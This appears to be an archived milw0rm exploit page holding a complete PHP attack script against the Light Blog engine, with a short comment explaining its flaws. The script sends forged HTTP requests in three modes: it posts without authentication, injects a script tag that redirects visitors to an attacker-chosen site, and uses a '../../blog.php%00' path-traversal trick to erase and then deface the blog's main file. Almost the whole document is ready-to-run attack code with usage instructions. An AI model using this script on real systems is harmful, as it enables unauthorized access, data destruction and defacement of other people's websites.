<html><head><title>Light Blog Remote Multiple Vulnerabilities Exploit</title></head><pre>#!/usr/bin/php -q -d short_open_tag=on
&lt;?
echo &quot;\r\n&quot;;
echo &quot;Light Blog Multiple Vulnerabilities Exploit\r\n&quot;;
echo &quot;by BlackHawk &lt;hawkgotyou@gmail.com&gt;\r\n&quot;;
echo &quot;Thanks to rgod for the php code and Marty for the Love\r\n\r\n&quot;;
if ($argc&lt;4) {
echo &quot;Usage: php &quot;.$argv[0].&quot; Site Path AttackType Related\r\n&quot;;
echo &quot;Host:             target server (ip/hostname)\r\n&quot;;
echo &quot;Path:             path to LightBlog\r\n&quot;;
echo &quot;AttackType:       1 - Create New Post (Title must be of one word)\r\n&quot;;
echo &quot;            |-&gt; Related: Title Post\r\n&quot;;
echo &quot;            |-&gt; Es: php &quot;.$argv[0].&quot; localhost /blog/ 1 Hacked I Got You\r\n\r\n&quot;;
echo &quot;          2 - Deface Blog (With XSS)\r\n&quot;;
echo &quot;            |-&gt; Related: WebPage\r\n&quot;;
echo &quot;            |-&gt; Es: php &quot;.$argv[0].&quot; localhost /blog/ 2 http://site.com/\r\n\r\n&quot;;
echo &quot;          3 - Deface Blog (Deleting blog.php)\r\n&quot;;
echo &quot;            |-&gt; Related: NickName\r\n&quot;;
echo &quot;            |-&gt; Es: php &quot;.$argv[0].&quot; localhost /blog/ 3 BlackHawk\r\n\r\n&quot;;
echo &quot;&quot;;
echo &quot;\r\n&quot;;
echo &quot;&quot;;
die;
}

/*
There are some critical vulnerabilities in this quite simple Blog Engine..

1 - You do not need to know the right password to send a new Post (no cecking);
2 - You can erase (even with mq=on) all file that are stored on the server:

[...]
$t = stripslashes($t);
[...]
$fc = fopen (&quot;blog_comments/$t.txt&quot;, &quot;w&quot;);
fwrite ($fc, &quot;&quot;);
[...]

3-Using point No 1 you can do some XSS couse there isn't any anti-Xss code for admins
4-If mq=on than you can deface the site (but no injecting PHP cause &lt; and &gt; are properly parsed)

sorry for my bad english,

BlackHawk hawkgotyou@gmail.com
*/
error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

function quick_dump($string)
{
 $result='';$exa='';$cont=0;
 for ($i=0; $i&lt;=strlen($string)-1; $i++)
 {
  if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
  {$result.=&quot;  .&quot;;}
  else
  {$result.=&quot;  &quot;.$string[$i];}
  if (strlen(dechex(ord($string[$i])))==2)
  {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
  else
  {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
  $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
 }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
 global $proxy, $host, $port, $html, $proxy_regex;
 if ($proxy=='') {
   $ock=fsockopen(gethostbyname($host),$port);
   if (!$ock) {
     echo 'No response from '.$host.':'.$port; die;
   }
 }
 else {
       $c = preg_match($proxy_regex,$proxy);
   if (!$c) {
     echo 'Not a valid proxy...';die;
   }
   $parts=explode(':',$proxy);
   echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
   $ock=fsockopen($parts[0],$parts[1]);
   if (!$ock) {
     echo 'No response from proxy...';die;
       }
 }
 fputs($ock,$packet);
 if ($proxy=='') {
   $html='';
   while (!feof($ock)) {
     $html.=fgets($ock);
   }
 }
 else {
   $html='';
   while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
     $html.=fread($ock,1);
   }
 }
 fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$attack_type=$argv[3];
$port=80;
$proxy=&quot;&quot;;


if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

switch($attack_type)
{
case 1: //Insert New Post
$title=$argv[4];
$message=&quot;&quot;;
for ($i=5; $i&lt;=$argc-1; $i++){
$message.=&quot; &quot;.$argv[$i];
}
$title=urlencode($title);
$message=urlencode($message);
echo &quot;Attack No 1 - Sending New Post..\r\n&quot;;
$data=&quot;t=$title&quot;;
$data.=&quot;&amp;c=$message&quot;;
$data.=&quot;&amp;Submit=Post&quot;;
$packet=&quot;POST &quot;.$p.&quot;LightBlog/blog_script.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;/blog.php\r\n&quot;;
$packet.=&quot;Accept-Language: it\r\n&quot;;
$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.=&quot;Accept-Encoding: gzip, deflate\r\n&quot;;
$packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n&quot;;
$packet.=&quot;Cache-Control: no-cache\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
echo &quot;Ok, Post Sent&quot;;
break;

case 2: // Deface With XSS
$dfc_url=$argv[4];
$deface_url=urlencode(&quot;&lt;script&gt;window.location=('$dfc_url')&lt;/script&gt;&quot;);
echo &quot;Attack No 2 - Sending New Post With XSS..\r\n&quot;;
$data=&quot;t=$deface_url&quot;;
$data.=&quot;&amp;c=msg&quot;;
$data.=&quot;&amp;Submit=Post&quot;;
$packet=&quot;POST &quot;.$p.&quot;LightBlog/blog_script.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;/blog.php\r\n&quot;;
$packet.=&quot;Accept-Language: it\r\n&quot;;
$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.=&quot;Accept-Encoding: gzip, deflate\r\n&quot;;
$packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n&quot;;
$packet.=&quot;Cache-Control: no-cache\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
echo &quot;Ok, Post Sent&quot;;
break;

break;
case 3: // Defacing the original blog.php file
$nickname=$argv[4];
$packet =&quot;GET &quot;.$p.&quot;LightBlog/blog_comments.php?comment=Comment&amp;title=title HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
$temp=explode(&quot;name=\&quot;rand\&quot; id=\&quot;rand\&quot; value=\&quot;&quot;,$html);
$temp2=explode(&quot;\&quot;&gt;&lt;/input&gt;&quot;,$temp[1]);
$random_code = $temp2[0];
$temp=explode(&quot;name=\&quot;rand\&quot; id=\&quot;rand\&quot; value=\&quot;$random_code\&quot;&gt;&lt;/input&gt;&quot;,$html);
$temp2=explode(&quot; &quot;,$temp[1]);
$small_code = $temp2[0];


$data=&quot;t=../../blog.php%00&quot;;
$data.=&quot;&amp;c=ciao&quot;;
$data.=&quot;&amp;Submit=Post&quot;;
$packet=&quot;POST &quot;.$p.&quot;/LightBlog/blog_script.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;/blog.php\r\n&quot;;
$packet.=&quot;Accept-Language: it\r\n&quot;;
$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.=&quot;Accept-Encoding: gzip, deflate\r\n&quot;;
$packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n&quot;;
$packet.=&quot;Cache-Control: no-cache\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
echo &quot;blog.php File erased\r\n&quot;;

// This part will work only if mq=off elsewhere the exploit will only delete blog.php
$deface_text=urlencode(&quot;|:. $nickname got you! .:&quot;);
$signature=urlencode(&quot; BlackHawk And Piggy-Marty Rulez info --&gt; &lt;hawkgotyou@gmail.com&gt;&quot;);
$packet =&quot;GET &quot;.$p.&quot;LightBlog/add_comment_script.php?name=$deface_text&amp;comment=$signature&amp;rand=$random_code&amp;val=$small_code&amp;Submit=Submit&amp;title=../../blog.php/%00 HTTP/1.0\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;blog.php\r\n&quot;;
$packet.=&quot;Accept-Language: it\r\n&quot;;
$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.=&quot;Accept-Encoding: gzip, deflate\r\n&quot;;
$packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
echo &quot;Ok, Blog Defaced&quot;;
break;
}
?&gt;

# milw0rm.com [2006-10-27]</pre></html>